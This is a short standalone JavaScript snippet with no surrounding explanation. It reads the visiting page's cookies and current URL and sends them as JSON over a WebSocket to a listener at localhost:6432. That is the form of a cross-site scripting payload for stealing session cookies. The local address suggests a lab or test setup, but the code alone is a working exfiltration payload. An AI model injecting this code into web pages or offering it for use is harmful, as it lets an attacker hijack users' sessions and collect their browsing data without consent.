
const data = {cookie: document.cookie, location: window.location.href};
const socket = new WebSocket("ws://localhost:6432");
socket.onopen = function() {
    socket.send(JSON.stringify(data));
    socket.close();
};
